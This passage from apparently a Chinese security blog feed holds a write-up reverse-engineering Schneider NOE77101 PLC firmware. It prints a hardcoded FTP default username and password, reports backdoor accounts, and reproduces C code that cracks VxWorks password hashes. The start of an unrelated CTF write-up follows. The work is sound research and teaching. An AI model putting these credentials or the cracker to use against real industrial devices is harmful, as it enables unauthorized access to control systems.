class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;hiendcpu.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;logo.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;miniplc.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;module.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;lib&#x2F;home.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;lib&#x2F;main.css</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;lib&#x2F;main.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;user</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;bandwidth.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;chkdsk.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;classes</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;dhcp_node_config.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;format_flash.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;french</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;ftp_passwd_config.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;german</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;globaldata.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;http_passwd_config.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;images</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;ioscanning.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;messaging.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;reboot.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;set_readonly.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;smtpconf.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;smtpdiag.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;spanish</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;support.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;web_page_Ver.ini</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;classes&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;french&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;german&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;images&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;embedded&#x2F;spanish&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system&#x2F;ctrlstat.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system&#x2F;ethernet.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system&#x2F;plccfg.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system&#x2F;rde.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;system&#x2F;riostat.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure&#x2F;user&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;unsecure&#x2F;user</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;unsecure&#x2F;user&#x2F;$TMP_EMPTY_DIR</span><br></pre></td></tr></table></figure></div><p><strong>fw/fw.ini文件内是固件版本，可以看到是3.60版本</strong><br><a href="https://i.loli.net/2018/07/19/5b50212aa5d39.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212aa5d39.jpg" class="lazyload"></a></p><p><strong>wwwroot/classes/内的jar文件即是Web配置端APP文件</strong><br><a href="https://i.loli.net/2018/07/19/5b50212abff53.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212abff53.jpg" class="lazyload"></a></p><p><strong>wwwroot/conf/exec/NOE77101.bin很明显就是NOE77101的固件了</strong><br><a href="https://i.loli.net/2018/07/19/5b50212adfc34.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212adfc34.jpg" class="lazyload"></a></p><p>那么接下来我们所要做的就是分析jar格式的APP文件，这也是此次题目所要求的，然后再研究bin文件中的其他漏洞</p><h2 id="2-Web配置APP默认账户及密码的获取"><a href="#2-Web配置APP默认账户及密码的获取" class="headerlink" title="2.Web配置APP默认账户及密码的获取"></a>2.Web配置APP默认账户及密码的获取</h2><p>针对jar包的逆向分析，常使用的工具是JD-GUI，安装该工具需要配置java环境。</p><p>打开后拖入所有jar包<br><a href="https://i.loli.net/2018/07/19/5b50212b11461.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212b11461.jpg" class="lazyload"></a></p><p>发现没有加壳和混淆，于是我们直奔主题，搜索字符串PASSWORD<br><a href="https://i.loli.net/2018/07/19/5b50212b3d26f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212b3d26f.jpg" class="lazyload"></a></p><p>密码来的太突然了</p><blockquote><p>USER = “sysdiag”<br>PASSWORD = “factorycast@schneider”</p></blockquote><p><a href="https://i.loli.net/2018/07/19/5b50212b599c6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212b599c6.jpg" class="lazyload"></a><br>可以看到是ftp连接的默认账号及密码</p><p>到这里题目所要求的就完成了</p><h2 id="3-bin固件分析"><a href="#3-bin固件分析" class="headerlink" title="3.bin固件分析"></a>3.bin固件分析</h2><h3 id="1-binwalk提取文件"><a href="#1-binwalk提取文件" class="headerlink" title="1.binwalk提取文件"></a>1.binwalk提取文件</h3><p>将NOE77101.bin在Ubuntu环境下用binwalk进行识别，显示为Zlib压缩类型<br><a href="https://i.loli.net/2018/07/19/5b50212b77c89.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212b77c89.jpg" class="lazyload"></a></p><p>使用<code>binwalk -e</code>命令提取文件<br><a href="https://i.loli.net/2018/07/19/5b50212b9494d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212b9494d.jpg" class="lazyload"></a><br>解压后的文件217存储在_NOE77101.bin.extracted目录中，并以文件在固件升级包中的起始位置来命名。</p><p>binwalk分析217文件<br><a href="https://i.loli.net/2018/07/19/5b50212bbc928.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212bbc928.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b5021407fa27.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021407fa27.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b502140a5855.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502140a5855.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2406504       0x24B868        VxWorks WIND kernel version &quot;2.5&quot;</span><br><span class="line">2421452       0x24F2CC        Copyright string: &quot;Copyright Wind River Systems, Inc., 1984-2000&quot;</span><br><span class="line">2435046       0x2527E6        Unix path: &#x2F;host&#x2F;resource&#x2F;tcl&#x2F;wtxerrdb.tcl</span><br><span class="line">2529396       0x269874        Copyright string: &quot;copyright_wind_river&quot;</span><br><span class="line">3232572       0x31533C        Copyright string: &quot;Copyright, Real-Time Innovations, Inc., 1991.  All rights reserved.&quot;</span><br><span class="line">3244384       0x318160        Copyright string: &quot;Copyright 1984-1996 Wind River Systems, Inc.&quot;</span><br><span class="line">3272404       0x31EED4        VxWorks symbol table, big endian, first entry: [type: function, code address: 0x223D64, symbol address: 0x2A8BC8]</span><br></pre></td></tr></table></figure></div><p>从最后几行看到，固件的操作系统版本是VxWorks 2.5，符号表地址也在最后给出，可以用于稍后修复函数名</p><blockquote><p>VxWorks 操作系统是美国WindRiver（风河）公司于设计开发。它以其良好的可靠性和卓越的实时性被广泛地应用在通信、军事、航空、航天等高精尖技术及实时性要求极高的领域中，如卫星通讯、军事演习、弹道制导、飞机导航等。在美国的 F-16、FA-18战斗机、B-2 隐形轰炸机和爱国者导弹上，甚至在火星登陆的探测器也都使用了VxWorks系统。最新的VxWorks7的口号是——为全球智能连接设备和系统提供动力。</p></blockquote><blockquote><p>由于固件特性，在普通逆向步骤上需要多三个部分</p><ol><li>修复代码函数位置</li><li>确定固件代码段基址</li><li>重构符号表</li></ol></blockquote><h3 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h3><h4 id="载入"><a href="#载入" class="headerlink" title="载入"></a>载入</h4><p>将217文件在IDA中分析<br>IDA加载固件后使用PPC Big-endian（PowerPC大端）处理器类型。<br><a href="https://i.loli.net/2018/07/19/5b502140c2b33.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502140c2b33.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b502140d7195.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b502140d7195.jpg" class="lazyload"></a></p><p>载入后没有出现“由于找不到代码段起始地址从而反编译失败”的问题，应该是出题人为了降低难度，已经修复好函数位置。(如果没有修复好的话可以用Ruben的idc脚本，但现在脚本链接不能访问了 <a href="http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc" target="_blank" rel="noopener">http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc</a>)</p><p>载入后如下<br><a href="https://i.loli.net/2018/07/19/5b50214106755.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50214106755.jpg" class="lazyload"></a></p><h4 id="确定固件的代码段基址"><a href="#确定固件的代码段基址" class="headerlink" title="确定固件的代码段基址"></a>确定固件的代码段基址</h4><p>虽然现在我们可以成功反编译，但我们还需要确定固件的代码段基址才能重构符号表<br>确定基址的思路是寻找一条相对寻址方式的lis指令。<br><a href="https://i.loli.net/2018/07/19/5b5021411a2fa.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021411a2fa.jpg" class="lazyload"></a></p><p>在IDA中使用ALT+T直接搜lis指令，CTRL+T进行向下(上)搜索，发现在<code>00000AA0</code>处的lis指令<br><a href="https://i.loli.net/2018/07/19/5b5021412daed.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021412daed.jpg" class="lazyload"></a></p><p><code>ROM:00000AA0       lis       r9, dword_358848@ha</code></p><p>观察地址后面的@ha确定基址为0x10000,这也是固件常用基址</p><p>对@h和@ha的问题，在IBM官网看到一篇文章</p><blockquote><p><a href="https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html</a><br><a href="https://i.loli.net/2018/07/19/5b50214142c8e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50214142c8e.jpg" class="lazyload"></a></p></blockquote><p>具体也不是很懂，还有这篇</p><blockquote><p><a href="http://blog.chinaunix.net/uid-20663797-id-35772.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-20663797-id-35772.html</a></p></blockquote><p>接下来重新载入ida，ppc模式，基址0x10000<br><a href="https://i.loli.net/2018/07/19/5b50214155d97.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50214155d97.jpg" class="lazyload"></a></p><p>成功反编译(和刚刚的应该没有变化)</p><p>接下来就该导入符号表了</p><h4 id="重构符号表"><a href="#重构符号表" class="headerlink" title="重构符号表"></a>重构符号表</h4><p>binwalk分析217文件时最后一行的符号表地址还记得吗？<br><a href="https://i.loli.net/2018/07/19/5b5021f2f24a9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f2f24a9.jpg" class="lazyload"></a></p><p>地址为<code>0x31EED4</code></p><p>使用010Editor打开217文件，搜索地址0x31EED4(ctrl+G)<br><a href="https://i.loli.net/2018/07/19/5b5021417134c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021417134c.jpg" class="lazyload"></a></p><blockquote><p>VxWorks系列的字节排序有独特的格式，以16个字节为一组数据，前4个字节是函数名的内存地址，后4个字节是函数的内存位置，然后以另4个特征字节数据+4个字节0x00结尾。</p></blockquote><p>于是符号表的起始地址是上一行的<strong><code>0x31EEC4</code></strong></p><p>一直向下查找，根据结构分析，结束地址为<strong><code>0x348114</code></strong><br><a href="https://i.loli.net/2018/07/19/5b5021f317c30.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f317c30.jpg" class="lazyload"></a></p><p>接下来我们就可以编写IDPython脚本重构符号表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from idaapi import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">eaStart &#x3D; 0x31eec4 </span><br><span class="line">eaEnd &#x3D; 0x348114</span><br><span class="line">ea &#x3D; eaStart</span><br><span class="line">while ea &lt; eaEnd:</span><br><span class="line">offset &#x3D; 0</span><br><span class="line">MakeStr(Dword(ea - offset), BADADDR)</span><br><span class="line">sName &#x3D; GetString(Dword(ea - offset), -1, ASCSTR_C)</span><br><span class="line">print sName</span><br><span class="line">if sName:</span><br><span class="line">eaFunc &#x3D; Dword(ea - offset + 4)</span><br><span class="line">MakeName(eaFunc,sName)</span><br><span class="line">MakeCode(eaFunc)</span><br><span class="line">MakeFunction(eaFunc,BADADDR)</span><br><span class="line">ea &#x3D; ea + 16</span><br><span class="line">print&quot;ok&quot;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/19/5b5021f33ad49.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f33ad49.jpg" class="lazyload"></a></p><p>运行脚本<br><a href="https://i.loli.net/2018/07/19/5b5021f35a8ec.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f35a8ec.jpg" class="lazyload"></a><br>修复完成</p><h4 id="固件后门账户"><a href="#固件后门账户" class="headerlink" title="固件后门账户"></a>固件后门账户</h4><p>查看usrAppInit函数，发现多个后门账户<br><a href="https://i.loli.net/2018/07/19/5b5021f37329a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f37329a.jpg" class="lazyload"></a></p><p>而密码则是经过loginDefaultEncrypt函数哈希加密<br>结合vxworks5的源码来看</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;******************************************************************************</span><br><span class="line">*</span><br><span class="line">* loginDefaultEncrypt - default password encryption routine</span><br><span class="line">*</span><br><span class="line">* This routine provides default encryption for login passwords.  It employs</span><br><span class="line">* a simple encryption algorithm.  It takes as arguments a string &lt;in&gt; and a</span><br><span class="line">* pointer to a buffer &lt;out&gt;.  The encrypted string is then stored in the</span><br><span class="line">* buffer.</span><br><span class="line">*</span><br><span class="line">* The input strings must be at least 8 characters and no more than 40</span><br><span class="line">* characters.</span><br><span class="line">*</span><br><span class="line">* If a more sophisticated encryption algorithm is needed, this routine can</span><br><span class="line">* be replaced, as long as the new encryption routine retains the same</span><br><span class="line">* declarations as the default routine.  The routine vxencrypt</span><br><span class="line">* in \f3host&#x2F;&lt;hostOs&gt;&#x2F;bin\fP</span><br><span class="line">* should also be replaced by a host version of &lt;encryptionRoutine&gt;.  For more</span><br><span class="line">* information, see the manual entry for loginEncryptInstall().</span><br><span class="line">*</span><br><span class="line">* RETURNS: OK, or ERROR if the password is invalid.</span><br><span class="line">*</span><br><span class="line">* SEE ALSO: loginEncryptInstall(), vxencrypt</span><br><span class="line">*</span><br><span class="line">* INTERNAL</span><br><span class="line">* The encryption is done by summing the password and multiplying it by</span><br><span class="line">* a magic number.</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">STATUS loginDefaultEncrypt</span><br><span class="line">    (</span><br><span class="line">    char *in,                           &#x2F;* input string *&#x2F;</span><br><span class="line">    char *out                           &#x2F;* encrypted string *&#x2F;</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">    int            ix;</span><br><span class="line">    unsigned long  magic     &#x3D; 31695317;</span><br><span class="line">    unsigned long  passwdInt &#x3D; 0;</span><br><span class="line"></span><br><span class="line">   if (strlen (in) &lt; 8 || strlen (in) &gt; 40)</span><br><span class="line">        &#123;</span><br><span class="line">errnoSet (S_loginLib_INVALID_PASSWORD);</span><br><span class="line">        return (ERROR);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    for (ix &#x3D; 0; ix &lt; strlen(in); ix++)         &#x2F;* sum the string *&#x2F;</span><br><span class="line">        passwdInt +&#x3D; (in[ix]) * (ix+1) ^ (ix+1);</span><br><span class="line"></span><br><span class="line">    sprintf (out, &quot;%u&quot;, (long) (passwdInt * magic)); &#x2F;* convert interger</span><br><span class="line">to string *&#x2F;</span><br><span class="line">    &#x2F;* make encrypted passwd printable *&#x2F;</span><br><span class="line"></span><br><span class="line">    for (ix &#x3D; 0; ix &lt; strlen (out); ix++)</span><br><span class="line">        &#123;</span><br><span class="line">        if (out[ix] &lt; &#39;3&#39;)</span><br><span class="line">            out[ix] &#x3D; out[ix] + &#39;!&#39;;    &#x2F;* arbitrary *&#x2F;</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &#39;7&#39;)</span><br><span class="line">            out[ix] &#x3D; out[ix] + &#39;&#x2F;&#39;;    &#x2F;* arbitrary *&#x2F;</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &#39;9&#39;)</span><br><span class="line">            out[ix] &#x3D; out[ix] + &#39;B&#39;;    &#x2F;* arbitrary *&#x2F;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return (OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/19/5b5021f38a71a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f38a71a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b5021f39f749.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f39f749.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b5021f3b3958.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5021f3b3958.jpg" class="lazyload"></a></p><p>结合源码看汇编就非常清晰了</p><blockquote><p>加密过程：</p></blockquote><blockquote><p>1.在第一个for循环中密码字符串逐字节与位置下标相乘再按位进行异或操作，然后将每一个字符的运算结果累加起来算出passwdInt。<br>2.passwdInt值与magic相乘再转化为String类型。<br>3.字符串逐字符与’3’、’7’、’9’进行比较，加相应的值。</p></blockquote><blockquote><p>可以通过随机生成密码来构建一个序列化的输入密码和passwdInt的对应表，同时passwdInt与输出密码之间也可构建对应表，这样输入密码和输出密码讲通过长度有限的Int类型passwdInt打通，这样我们就能通过查表的方式由输出密码得到输入密码。相比于MD5、SHA1等加密算法，vxencrypt加密算法由于加密方式问题导致密文长度受限，以至于存在弱点。</p></blockquote><p>Rapid7 研究员HD Moore曾经发现VxWorks 5.x系统默认加密方式存在缺陷的研究文章</p><blockquote><p><a href="http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes" target="_blank" rel="noopener">http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes</a></p></blockquote><p>解密程序</p><blockquote><p><a href="https://github.com/cvonkleist/vxworks_hash" target="_blank" rel="noopener">https://github.com/cvonkleist/vxworks_hash</a></p></blockquote><p>这里贴上C的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; cvk&#x2F;2010-08-09</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; password settings</span><br><span class="line">#define MIN_LENGTH 8</span><br><span class="line">#define MAX_LENGTH 40</span><br><span class="line">char *charset &#x3D; &quot; !\&quot;#$%&amp;&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&#96;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;;</span><br><span class="line">#define CHARSET_LENGTH 95</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; shortcut hash table</span><br><span class="line">#define MAX_SUM 110000</span><br><span class="line">char sums[MAX_SUM][MAX_LENGTH + 1];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; stage one of the hashing algorithm: the sum</span><br><span class="line">unsigned long sum(char *plaintext) &#123;</span><br><span class="line">  unsigned long s &#x3D; 0;</span><br><span class="line">  int i;</span><br><span class="line">  for (i &#x3D; 0; i &lt; strlen(plaintext); i++)</span><br><span class="line">    s +&#x3D; (plaintext[i]) * (i + 1) ^ (i + 1);</span><br><span class="line">  return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; builds a random password</span><br><span class="line">void random_password(char *password) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int length &#x3D; rand() % (MAX_LENGTH - MIN_LENGTH) + MIN_LENGTH;</span><br><span class="line">  for(i &#x3D; 0; i &lt; length; i++)</span><br><span class="line">    password[i] &#x3D; charset[rand() % CHARSET_LENGTH];</span><br><span class="line">  password[length] &#x3D; &#39;\0&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; randomly creates checksums</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; when it discovers a shorter input plaintext for a checksum that has already</span><br><span class="line">&#x2F;&#x2F; been calculated, it replaces the existing plaintext with the new, shorter</span><br><span class="line">&#x2F;&#x2F; one</span><br><span class="line">void brute(int runs) &#123;</span><br><span class="line">  int i;</span><br><span class="line">  char password[MAX_LENGTH + 1];</span><br><span class="line">  unsigned long s;</span><br><span class="line"></span><br><span class="line">  for(i &#x3D; 0; i &lt; runs; i++) &#123;</span><br><span class="line">    random_password(password);</span><br><span class="line">    s &#x3D; sum(password);</span><br><span class="line">    if(s &gt; MAX_SUM) &#123;</span><br><span class="line">      printf(&quot;error! sum too big&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    if(sums[s][0] &#x3D;&#x3D; &#39;\0&#39; || strlen(password) &lt; strlen(sums[s])) &#123;</span><br><span class="line">      strcpy(sums[s], password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; returns the number of checksums in the table</span><br><span class="line">int count() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  int c &#x3D; 0;</span><br><span class="line">  for(i &#x3D; 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] !&#x3D; &#39;\0&#39;)</span><br><span class="line">      c++;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; prints discovered checksums</span><br><span class="line">void dump_table() &#123;</span><br><span class="line">  int i;</span><br><span class="line">  for(i &#x3D; 0; i &lt; MAX_SUM; i++)</span><br><span class="line">    if(sums[i][0] !&#x3D; &#39;\0&#39;)</span><br><span class="line">      printf(&quot;%d\t%s\n&quot;, i, sums[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  brute(1000000000);</span><br><span class="line">  printf(&quot;%d checksums\n&quot;, count());</span><br><span class="line">  dump_table();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，对施耐德NOE77101的基本探究就结束了，其他漏洞还包括wireshark抓ftp包，账号密码明文显示等，就留着以后研究了，总体来说还是很有收获。</p><p>See you again！</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;施耐德NOE77101以太网模块固件逆向及后门挖掘&quot;&gt;&lt;a href=&quot;#施耐德NOE77101以太网模块固件逆向及后门挖掘&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="PLC固件" scheme="https://kabeor.github.io/tags/PLC%E5%9B%BA%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>看雪.京东 2018CTF helloctf</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/"/>
    <id>https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:32:36.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-京东-2018CTF-helloctf"><a href="#看雪-京东-2018CTF-helloctf" class="headerlink" title="看雪.京东 2018CTF helloctf"></a>看雪.京东 2018CTF helloctf</h1><p>IDA打开，<br><a href="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" class="lazyload"></a></p><p>F5之后<br><a href="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" class="lazyload"></a></p><p>do…while循环就是核心算法<br>自己提取出来<br><a href="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" class="lazyload"></a></p><p>意思就很明显了，需要注意的就是asc_408044内是字符串%x，也就是16进制，sprintf是字符串类型格式化，很显然这里就是将输入字符串转换为16进制，strcat为将后一字符串加到前一字符串尾部，这里很显然就是32位0再加437261636b4d654a757374466f7246756e</p><p>所以我们只需要将其进行16进制转字符串即可(多个0可省略，只需补齐位数为偶数)<br><a href="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img 